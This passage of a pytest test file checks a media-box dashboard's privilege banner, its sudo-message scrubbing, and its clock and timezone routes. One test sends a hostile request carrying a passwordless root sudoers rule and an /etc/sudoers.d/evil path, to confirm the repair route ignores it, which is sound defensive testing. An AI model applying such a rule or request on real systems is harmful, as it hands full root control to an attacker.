    arriving from the network and reaching sudoers_rule() would be the whole
    box handed over. The route reads no body and no query string.
    """
    client, _, _ = box
    calls = []
    monkeypatch.setattr(
        servicectl, "repair",
        lambda *args, **kwargs: (
            calls.append((args, kwargs)),
            servicectl.RepairResult(applied=False, message="nothing was changed"),
        )[1],
    )
    res = client.post(
        "/api/system/privileges/repair?username=root&path=/etc/sudoers.d/evil",
        json={"username": "root", "rule": "ALL=(ALL) NOPASSWD: ALL",
              "path": "/etc/sudoers.d/evil"},
    )
    assert res.status_code == 200, res.get_data(as_text=True)
    assert calls == [((), {})], f"the request reached servicectl.repair: {calls}"


def test_the_repair_from_the_dashboard_changes_nothing_and_says_so(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "repair",
        lambda *a, **k: servicectl.RepairResult(
            applied=False,
            message="This is the one thing the dashboard is not allowed to fix "
                    "by itself.",
            detail="not root, so /etc/sudoers.d/retrobox-system was not touched",
        ),
    )
    body = client.post("/api/system/privileges/repair").get_json()
    assert body["applied"] is False
    assert "not allowed to fix" in body["message"]
    assert "/etc/sudoers.d" not in str(body), "the page shows sudo's own paths"


def test_the_command_to_type_is_the_one_for_this_box(box, monkeypatch):
    """A customer pastes it verbatim, so a generic one is a wasted trip."""
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(servicectl.PRIVILEGES_STALE),
    )
    body = client.get("/api/system/privileges").get_json()
    assert body["command"] == servicectl.FIX_COMMAND
    assert str(Path(__file__).resolve().parent.parent) in body["command"]
    assert body["user"] == servicectl.current_user()


def test_a_box_that_cannot_use_sudo_at_all_is_not_offered_a_repair(box, monkeypatch):
    """Re-generating the file fixes nothing when sudo cannot become root.

    That is the unit file, not the rule, and a Repair button on it would send
    somebody round a loop that cannot end.
    """
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(
            servicectl.PRIVILEGES_BLOCKED,
            headline="Something is stopping this box acting on its own settings",
        ),
    )
    body = client.get("/api/system/privileges").get_json()
    assert body["needs_repair"] is True
    assert body["repairable"] is False, "it offered to re-run a fix that cannot work"


def test_the_box_checks_its_own_permission_when_systemd_starts_it(
    tmp_path, runtime, monkeypatch
):
    """A box nobody opens the dashboard on still gets the fault in its log."""
    monkeypatch.setenv("INVOCATION_ID", "0123456789abcdef")
    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")
    asked = []
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: (asked.append(1), a_check(servicectl.PRIVILEGES_STALE))[1],
    )
    app = create_app(str(cfg))
    app.privilege_startup.join(timeout=5)
    assert asked, "a box booting never asks whether it can still do its job"

    # And the answer is kept, so the first System page load is free.
    app.config.update(TESTING=True)
    body = app.test_client().get("/api/system/privileges").get_json()
    assert body["state"] == servicectl.PRIVILEGES_STALE
    assert len(asked) == 1


def test_a_permission_check_that_throws_never_stops_the_dashboard_starting(
    tmp_path, runtime, monkeypatch
):
    """The box with a broken sudoers file is the box that most needs its page."""
    monkeypatch.setenv("INVOCATION_ID", "0123456789abcdef")
    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")

    def explodes(**kw):
        raise RuntimeError("sudo is not installed")

    monkeypatch.setattr(servicectl, "check_privileges", explodes)
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    app.privilege_startup.join(timeout=5)
    assert app.test_client().get("/api/status").status_code == 200


def test_a_dashboard_that_systemd_did_not_start_asks_sudo_nothing(
    tmp_path, runtime, monkeypatch, not_a_service
):
    """Twenty-one sudo probes per app object is not a cost a laptop should pay.

    On a real box this process is always started by systemd, which sets
    INVOCATION_ID. A checkout, or this suite, is not a box that boots.
    """
    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")
    asked = []
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: (asked.append(1), a_check(servicectl.PRIVILEGES_OK))[1],
    )
    app = create_app(str(cfg))
    assert app.privilege_startup is None
    assert asked == []


def test_the_support_bundle_says_the_state_without_quoting_sudo(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: a_check(
            servicectl.PRIVILEGES_STALE,
            detail="sudo: a password is required; /etc/sudoers.d/retrobox-system",
        ),
    )
    client.get("/api/system/privileges")          # the page load that asks

    text = client.get("/api/system/support").get_data(as_text=True)
    assert "Permission:" in text
    assert "out of date" in text
    assert "sudo:" not in text
    assert "/etc/sudoers.d" not in text


def test_fetching_the_support_bundle_does_not_itself_go_asking_sudo(box, monkeypatch):
    """It is a GET, on a page with no login, and it would spawn twenty-one."""
    client, _, _ = box
    asked = []
    monkeypatch.setattr(
        servicectl, "check_privileges",
        lambda **kw: (asked.append(1), a_check(servicectl.PRIVILEGES_OK))[1],
    )
    client.get("/api/system/support")
    assert asked == []


def test_a_refused_power_button_is_explained_rather_than_quoted(box, monkeypatch):
    """What the customer reads instead of "sudo: a password is required"."""
    client, _, _ = box
    monkeypatch.setattr(
        servicectl, "_run", lambda cmd, **kw: (1, "sudo: a password is required")
    )
    said = client.post("/api/system/service/reboot?confirm=yes").get_json()["error"]
    assert said == servicectl.permission_message("reboot")
    assert "sudo" not in said
    assert "password" not in said, "it sends them looking for a password to type"


def test_a_refused_clock_change_is_explained_rather_than_quoted(box, monkeypatch):
    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "UTC\n" if "list-timezones" in cmd else "",
    )
    monkeypatch.setattr(
        servicectl, "_run",
        lambda cmd, **kw: (1, "sudo: interactive authentication is required"),
    )
    said = client.post(
        "/api/system/timezone", json={"timezone": "UTC"}
    ).get_json()["error"]
    assert said == servicectl.permission_message("timezone")
    assert "sudo" not in said


# -- the page itself -------------------------------------------------------
def test_the_banner_sits_at_the_very_top_of_the_system_page(box):
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    section = page.split('<section id="tab-system"')[1].split("</section>")[0]
    assert 'id="privileges"' in section
    assert section.index('id="privileges"') < section.index("<h2>Health</h2>"), (
        "the fault that stops the buttons working is below the buttons"
    )


def test_opening_the_system_page_asks_whether_the_box_can_still_do_its_job(box):
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    loader = page.split("async function loadSystem()")[1].split("\n}")[0]
    assert "/api/system/privileges" in loader or "loadPrivileges()" in loader


def test_the_permission_banner_is_never_polled(box):
    """A poll loop on this endpoint is 21 processes every few seconds."""
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    for line in page.splitlines():
        if "setInterval" in line or "setTimeout" in line:
            assert "rivilege" not in line, f"the check is on a timer: {line}"


def test_the_page_only_offers_the_repair_when_it_could_help(box):
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    drawer = page.split("function drawPrivileges")[1].split("\n}")[0]
    assert "repairable" in drawer, (
        "the banner offers the same button whatever the fault is, including "
        "the one re-running the installer cannot fix"
    )


def test_a_power_button_that_comes_back_refused_puts_the_banner_up(box):
    """The toast is gone in four seconds. The banner stays until it is fixed."""
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    handler = page.split("for (const [action, label, confirmLabel, danger] of SERVICES)")[1]
    handler = handler.split("$('#service-buttons').append(button);")[0]
    assert "loadPrivileges()" in handler
    assert handler.index("catch") < handler.index("loadPrivileges()"), (
        "it goes asking after a button that worked"
    )


def test_a_check_that_keeps_failing_is_rationed_exactly_like_one_that_works(
    box, monkeypatch
):
    """Otherwise the endpoint with no ceiling on it is the broken box's.

    A box with no sudo on it at all answers every one of these with an
    exception, and this page has no login: an answer that is never remembered
    is an answer that is fetched again for every press, for ever.
    """
    client, _, _ = box
    asked = []

    def explodes(**kw):
        asked.append(1)
        raise OSError("no sudo on this box")

    monkeypatch.setattr(servicectl, "check_privileges", explodes)
    for _ in range(5):
        client.get("/api/system/privileges")
    assert len(asked) == 1


def test_every_group_of_privileges_has_buttons_this_page_can_name():
    """A tripwire, so a new privileged command cannot go unnamed in the banner.

    servicectl decides what this box needs root for and groups it; only this
    page knows what those groups are called on the screen. A group added there
    with nothing added here would show a customer a banner about a fault with
    no buttons listed under it, which is the "some features are unavailable"
    this whole panel exists to avoid.
    """
    from retrobox import webui

    assert set(webui.PRIVILEGE_BUTTONS) == set(servicectl.GROUP_LABELS), (
        "servicectl and the banner disagree about what this box does as root"
    )


# ==========================================================================
# The clock, and the two-dollar part nobody would ever guess at
# ==========================================================================
# dayparting reads nothing but the local clock, so a box whose clock is wrong
# does not error and does not look broken - it plays the wrong thing and the
# owner decides the feature does not work. These are the routes that say so.
@pytest.fixture
def time_state(box):
    """Where the dashboard keeps what this box knows about its own clock."""
    from retrobox import timekeeping

    _, cfg, _ = box
    return Path(cfg).with_name(timekeeping.STATE_NAME)


def test_the_clock_page_says_what_is_wrong_and_names_the_part(box, monkeypatch):
    """"The RTC is not being maintained" is not something anybody can act on.

    A ten-year-old office mini PC with a flat coin cell comes up in 2011 every
    single time it is switched off at the wall, which is how these boxes are
    switched off. The alarm is raised only when nothing is going to put it
    right by itself, because that is the only state a person has to act on.
    """
    from retrobox import timekeeping

    client, _, _ = box
    monkeypatch.setattr(timekeeping, "clock_is_plausible", lambda **k: False)

    body = client.get("/api/system/clock").get_json()
    assert body["alarm"] is True
    assert body["headline"] == timekeeping.CMOS_HEADLINE
    assert timekeeping.CMOS_PART in body["detail"]
    assert body["sync"]["summary"], "it cannot say whether anything keeps it right"


def test_the_clock_page_stays_quiet_when_there_is_nothing_to_act_on(box):
    """A right clock gets no red banner. An alarm nobody can act on is noise."""
    client, _, _ = box
    body = client.get("/api/system/clock").get_json()
    assert body["alarm"] is False
    assert body["headline"] is None


def test_choosing_a_timezone_by_hand_is_written_down_so_detection_cannot_undo_it(
    box, ran, monkeypatch, time_state
):
    """The whole difference between "nobody told it" and "somebody meant it".

    Without this the box asks a lookup service where it is on the next boot
    onto a new network and quietly moves the zone the owner chose.
    """
    from retrobox import timekeeping

    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Australia/Sydney\n" if "list-timezones" in cmd else "",
    )
    res = client.post("/api/system/timezone", json={"timezone": "Australia/Sydney"})
    assert res.status_code == 200, res.get_json()

    written = timekeeping.read_state(time_state)
    assert written["source"] == timekeeping.SOURCE_MANUAL
    assert written["zone"] == "Australia/Sydney"


def test_a_timezone_that_was_refused_is_not_written_down_as_chosen(
    box, monkeypatch, time_state
):
    """Only a change that actually happened may be recorded as one."""
    from retrobox import timekeeping

    client, _, _ = box
    monkeypatch.setattr(
        sysinfo, "_run",
        lambda cmd, **k: "Australia/Sydney\n" if "list-timezones" in cmd else "",
    )
    monkeypatch.setattr(
        servicectl, "_run",
        lambda cmd, **kw: (1, "sudo: a password is required"),
    )
    assert client.post(
        "/api/system/timezone", json={"timezone": "Australia/Sydney"}
    ).status_code == 400
    assert timekeeping.read_state(time_state) == {}


def test_a_box_that_systemd_starts_looks_at_its_own_clock_without_being_asked(
    tmp_path, runtime, monkeypatch
):
    """The fault erases its own evidence, so it has to be caught at start-up.

    A flat coin cell plus a working internet connection is a box that is wrong
    for forty seconds and then perfectly normal. By the time anybody opens the
    dashboard there is nothing left to see.
    """
    from retrobox import timekeeping, webui

    monkeypatch.setenv("INVOCATION_ID", "0123456789abcdef")
    root = tmp_path / "media"
    make_show(root, "sitcoms", 1)
    cfg = tmp_path / "config.yaml"
    cfg.write_text(
        f"media_root: {root}\ntime:\n  detect_timezone: false\n"
        f"channels:\n  - number: 2\n    name: \"Sitcoms\"\n"
        f"    path: {root / 'sitcoms'}\n"
    )
    started = []
    monkeypatch.setattr(
        timekeeping, "start",
        lambda **kw: (started.append(kw), None)[1],
    )
    app = create_app(str(cfg))

    assert started, "a box that boots never looks at its own clock"
    assert started[0]["state_path"] == cfg.with_name(timekeeping.STATE_NAME)
    # And the owner's off switch is carried in, not re-read somewhere else.
    assert started[0]["config"].time.detect_timezone is False


def test_the_clock_thread_is_never_joined_so_a_wedged_lookup_cannot_hold_the_page(
    tmp_path, runtime, monkeypatch
):
    """A box with a corrupt time record must still get a working dashboard."""
    from retrobox import timekeeping

    monkeypatch.setenv("INVOCATION_ID", "0123456789abcdef")
    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")
    state = cfg.with_name(timekeeping.STATE_NAME)
    state.write_text("{ this is not json")

    started = threading.Event()
    finish = threading.Event()

    def slow(**kw):
        def work():
            started.set()
            finish.wait(10)
        thread = threading.Thread(target=work, daemon=True)
        thread.start()
        return thread

    monkeypatch.setattr(timekeeping, "start", slow)
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    try:
        assert started.wait(5), "the clock work never began"
        assert app.test_client().get("/api/status").status_code == 200
        assert app.timekeeping_startup.is_alive(), "it was joined, or never ran"
        assert app.timekeeping_startup.daemon, "a shutdown would wait for it"
    finally:
        finish.set()


def test_a_clock_check_that_throws_never_stops_the_dashboard_starting(
    tmp_path, runtime, monkeypatch
):
    from retrobox import timekeeping

    monkeypatch.setenv("INVOCATION_ID", "0123456789abcdef")
    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")

    def explodes(**kw):
        raise RuntimeError("the time record is a directory")

    monkeypatch.setattr(timekeeping, "start", explodes)
    app = create_app(str(cfg))
    app.config.update(TESTING=True)
    assert app.test_client().get("/api/status").status_code == 200


def test_a_dashboard_that_systemd_did_not_start_sends_nothing_to_anybody(
    tmp_path, runtime, monkeypatch, not_a_service
):
    """Detection is one outbound request. A checkout is not a box that booted."""
    from retrobox import timekeeping

    cfg = tmp_path / "config.yaml"
    cfg.write_text("channels: []\n")
    started = []
    monkeypatch.setattr(timekeeping, "start",
                        lambda **kw: (started.append(kw), None)[1])
    app = create_app(str(cfg))
    assert app.timekeeping_startup is None
    assert started == []


def test_the_off_switch_for_location_detection_says_what_gets_sent(box):
    """This feature sends the box's public address to a third party.

    That sentence does not get buried under a "learn more". It is printed
    beside the switch, in the payload, so the page cannot show one without
    the other.
    """
    from retrobox import timekeeping

    client, _, _ = box
    detection = client.get("/api/system/clock").get_json()["detection"]
    assert detection["enabled"] is True
    assert detection["what_is_sent"] == timekeeping.WHAT_IS_SENT
    assert detection["providers"], "it will not say who it asks"


def test_turning_location_detection_off_is_written_to_the_config(box):
    client, cfg, _ = box
    res = client.post("/api/system/clock/detection", json={"enabled": False})
    assert res.status_code == 200, res.get_json()
    assert load_config(cfg).time.detect_timezone is False
    assert client.get("/api/system/clock").get_json()["detection"]["enabled"] is False

    client.post("/api/system/clock/detection", json={"enabled": True})
    assert load_config(cfg).time.detect_timezone is True


def test_the_detection_switch_refuses_anything_that_is_not_a_yes_or_a_no(box):
    client, cfg, _ = box
    before = cfg.read_text()
    assert client.post(
        "/api/system/clock/detection", json={"enabled": "off"}
    ).status_code == 400
    assert cfg.read_text() == before


def test_the_support_bundle_never_repeats_sudos_own_words_from_the_log(
    box, monkeypatch
):
    """The bundle is a document a customer pastes into an email to us.

    The privilege check writes what sudo actually said into the journal, which
    is right - somebody who can act on it reads it there. The last two hundred
    journal lines are also the tail of this bundle, so without this the words
    the banner exists to keep off the screen arrive on it by the back door.
    """
    from retrobox import journal

    client, _, _ = box
    monkeypatch.setattr(journal, "read", lambda **kw: {"entries": [
        {"time": "12:00", "level": "warning", "unit": "retrobox-web",
         "message": "privileges blocked: sudo cannot become root: "
                    "sudo: effective uid is not 0"},
        {"time": "12:01", "level": "info", "unit": "retrobox",
         "message": "channel 2 is playing"},
    ]})
    text = client.get("/api/system/support").get_data(as_text=True)

    assert "sudo: effective uid is not 0" not in text
    assert "channel 2 is playing" in text, "it threw away the ordinary log too"


def _one_log_line(client, monkeypatch, message):
    """The live log viewer's answer for a single journal line."""
    from retrobox import journal

    monkeypatch.setattr(journal, "read", lambda **kw: {
        "entries": [{"time": "12:00", "level": "warning",
                     "unit": "retrobox-web.service", "message": message}],
        "cursor": None, "truncated": False, "available": True,
    })
    return client.get("/api/system/logs").get_json()["entries"][0]["message"]


def test_the_live_log_viewer_scrubs_sudo_exactly_as_the_support_bundle_does(
    box, monkeypatch
):
    """The log panel on the System tab is read by the owner, not by us.

    The bundle was scrubbed and this route was not, so the one sentence the
    permission banner exists to keep off a customer's screen arrived on it
    anyway - in the panel directly above that banner, on the same tab.
    """
    client, _, _ = box
    said = _one_log_line(
        client, monkeypatch,
        "privileges stale: sudo: interactive authentication is required",
    )
    assert "interactive authentication" not in said
    assert "sudo:" not in said
    assert "privileges stale" in said, "it threw this box's own words away too"


def test_scrubbing_sudo_keeps_this_boxs_own_words_and_the_paths_sudo_named(
    box, monkeypatch
):
    """The scrubber used to eat the whole line and claim in a comment that it did not.

    Everything after "sudo:" went, so the paths and the words this box wrote
    around sudo's sentence went with it - which is exactly the half of the
    line a support conversation is for. A path is a fact about this box, not a
    sentence anybody could mistake for advice, so it stays.
    """
    client, _, _ = box

    ours = _one_log_line(
        client, monkeypatch,
        "privileges blocked: sudo cannot become root: "
        "sudo: a password is required (/usr/bin/systemctl reboot)",
    )
    assert "a password is required" not in ours
    assert "sudo cannot become root" in ours, "our own words before it were eaten"
    assert "/usr/bin/systemctl" in ours, "the path sudo was asked about was eaten"

    theirs = _one_log_line(
        client, monkeypatch,
        "sudo: /etc/sudoers.d/retrobox-system is mode 0777, should be 0440",
    )
    assert "should be 0440" not in theirs
    assert "/etc/sudoers.d/retrobox-system" in theirs


def test_this_boxs_own_log_lines_survive_this_boxs_own_scrubber(box, monkeypatch, caplog):
    """A line written "refused by sudo: ..." was eaten by its own prefix.

    The scrubber cuts from the first "sudo:" on the line, so a prefix written
    that way put every word this box had to say - including which command
    actually failed - on the far side of the cut.
    """
    from retrobox.netconf import NetworkError
    from retrobox.webui import _for_a_customer

    client, _, _ = box
    with caplog.at_level("WARNING"):
        _for_a_customer(NetworkError("git fetch failed: sudo: a password is required"))
    written = caplog.records[-1].getMessage()

    said = _one_log_line(client, monkeypatch, written)
    assert "a password is required" not in said
    assert "git fetch failed" in said


def test_the_support_bundle_keeps_the_paths_that_make_the_line_worth_pasting(
    box, monkeypatch
):
    """The bundle is what a support conversation actually reads.

    Scrubbing sudo down to nothing at all makes the bundle safe and useless.
    The path this box was refused is the part that says which grant is
    missing, and it is not a sentence that sends anybody looking for a
    password.
    """
    from retrobox import journal

    client, _, _ = box
    monkeypatch.setattr(journal, "read", lambda **kw: {"entries": [
        {"time": "12:00", "level": "warning", "unit": "retrobox-web",
         "message": "privileges blocked: sudo cannot become root: "
                    "sudo: a password is required (/usr/bin/systemctl reboot)"},
    ]})
    text = client.get("/api/system/support").get_data(as_text=True)

    assert "a password is required" not in text
    assert "/usr/bin/systemctl" in text


# -- the clock on the page -------------------------------------------------
def test_the_system_page_asks_the_box_about_its_clock(box):
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    assert "/api/system/clock" in page


def test_the_clock_is_never_polled(box):
    """report() shells out to timedatectl; a timer on it is a timer on that."""
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    for line in page.splitlines():
        if "setInterval" in line or "setTimeout" in line:
            assert "loadClock" not in line, f"the clock is on a timer: {line}"


def test_the_banner_tells_a_missing_grant_from_a_box_that_cannot_use_sudo(
    box, monkeypatch
):
    """Two faults, two fixes, and pasting the wrong one is a wasted evening.

    "Nothing was ever granted" is fixed by re-running the installer. "sudo
    cannot become root here" is the service unit, and no amount of re-running
    anything touches it. A banner that said the same thing for both would send
    the second owner off to type a command that cannot possibly help.
    """
    client, _, _ = box
    # The one answer this dashboard keeps is deliberately debounced, so the
    # second of these two questions would otherwise get the first one's answer.
    monkeypatch.setattr("retrobox.webui.PRIVILEGE_CHECK_TTL", 0)
    said = {}
    for state in (servicectl.PRIVILEGES_MISSING, servicectl.PRIVILEGES_BLOCKED):
        monkeypatch.setattr(
            servicectl, "check_privileges",
            lambda state=state, **kw: a_check(
                state,
                headline=f"headline for {state}",
                message=f"what to do about {state}",
            ),
        )
        said[state] = client.get("/api/system/privileges").get_json()

    missing, blocked = said[servicectl.PRIVILEGES_MISSING], said[servicectl.PRIVILEGES_BLOCKED]
    assert missing["headline"] != blocked["headline"]
    assert missing["message"] != blocked["message"]
    assert missing["repairable"] is True
    assert blocked["repairable"] is False


def test_a_refused_clock_change_puts_the_banner_up_rather_than_a_toast(box):
    """The toast is gone in four seconds; the fault is not."""
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    handler = page.split("'/api/system/timezone', 'POST'")[1].split("\n  };")[0]
    assert "loadPrivileges()" in handler, (
        "a timezone the box was not allowed to set leaves nothing on the page"
    )


def test_a_refused_network_change_puts_the_banner_up_rather_than_a_toast(box):
    client, _, _ = box
    page = client.get("/dash").get_data(as_text=True)
    handler = page.split("async function submitNetwork")[1].split("\n}")[0]
    assert "loadPrivileges()" in handler, (
        "a network change the box was not allowed to make leaves nothing on the page"
    )
